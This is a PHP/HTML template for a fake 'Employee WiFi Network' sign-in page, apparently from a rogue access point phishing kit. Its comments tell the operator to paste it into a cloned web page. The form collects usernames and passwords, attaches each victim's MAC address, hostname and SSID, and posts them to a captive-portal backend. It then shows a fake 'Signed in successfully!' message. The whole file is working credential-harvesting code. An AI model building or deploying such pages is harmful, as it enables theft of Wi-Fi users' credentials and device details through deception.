<?php
// copy and paste this whole PHP code block at the beginning of a cloned web page

include_once './helper.php';

// prevent HTTP caching
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');
header('Expires: 0');

function findParameter($url, $name, $value = '') {
    $value = urlencode($value);
    return stripos($url, "?{$name}={$value}") || stripos($url, "&{$name}={$value}");
}

function addParameter($url, $name, $value = '') {
    $value = urlencode($value);
    return $url . (stripos($url, '?') ? '&' : '?') . "{$name}={$value}";
}

function getRedirectURL() {
    // you can also redirect users to e.g. https://www.google.com
    $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    // add a custom request parameter, e.g. if you wish to display a custom message after submitting the form
    // this part is optional
    if (!findParameter($url, 'status')) {
        $url = addParameter($url, 'status', 'success');
        // $url = addParameter($url, 'status', 'error');
    }
    return $url;
}

$inputValues = array(
    'mac' => getClientMac($_SERVER['REMOTE_ADDR']),
    'host' => getClientHostName($_SERVER['REMOTE_ADDR']),
    'ssid' => getClientSSID($_SERVER['REMOTE_ADDR']),
    // redirect the user after sign in
    'target' => getRedirectURL()
);
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<!-- change title to your liking -->
		<title>Company&#8482; | Employee WiFi Network</title>
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" href="./css/main.css" hreflang="en" type="text/css" media="all">
	</head>
	<body class="background-img">
		<div class="front-form">
			<div class="layout">
				<div class="logo">
					<img src="./img/logo.png" alt="Logo">
				</div>
				<!-- change headers to your liking -->
				<header>
					<h1 class="title">Company&#8482;</h1>
					<h1 class="subtitle">Employee WiFi Network</h1>
				</header>
				<!-- copy and paste this form attributes to the cloned web page form -->
				<form method="post" action="./captiveportal/index.php">
					<!-- make sure to correctly modify form input fields on the cloned web page -->
					<!-- because backend will only accept "username", "email", and "password" input fields in addition to "mac", "host", "ssid", and "target" input fileds -->
					<input name="username" id="username" type="text" spellcheck="false" placeholder="Username" required="required">
					<!-- <input name="email" id="email" type="text" spellcheck="false" placeholder="Email" required="required"> -->
					<!-- you can add your own regular expression attribute in the email input field to limit the scope -->
					<!-- pattern="^[^\s]+@company\.com$" -->
					<!-- or you can use the universal one -->
					<!-- pattern="^(([^<>()\[\]\\.,;:\s@\u0022]+(\.[^<>()\[\]\\.,;:\s@\u0022]+)*)|(\u0022.+\u0022))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$" -->
					<input name="password" id="password" type="password" placeholder="Password" required="required">
					<!-- do not forget to copy these hidden input fields -->
					<input name="mac" id="mac" type="hidden" value="<?php echo $inputValues['mac']; ?>">
					<input name="host" id="host" type="hidden" value="<?php echo $inputValues['host']; ?>">
					<input name="ssid" id="ssid" type="hidden" value="<?php echo $inputValues['ssid']; ?>">
					<input name="target" id="target" type="hidden" value="<?php echo $inputValues['target']; ?>">
					<input type="submit" value="Sign In">
					<!-- display a custom message after submitting the form -->
					<?php if (findParameter($_SERVER['REQUEST_URI'], 'status', 'success')): ?>
						<p class="message">Signed in successfully!</p>
					<?php elseif (findParameter($_SERVER['REQUEST_URI'], 'status', 'error')): ?>
						<p class="message">Ups! Failed to sign in...</p>
					<?php endif; ?>
				</form>
			</div>
		</div>
	</body>
</html>
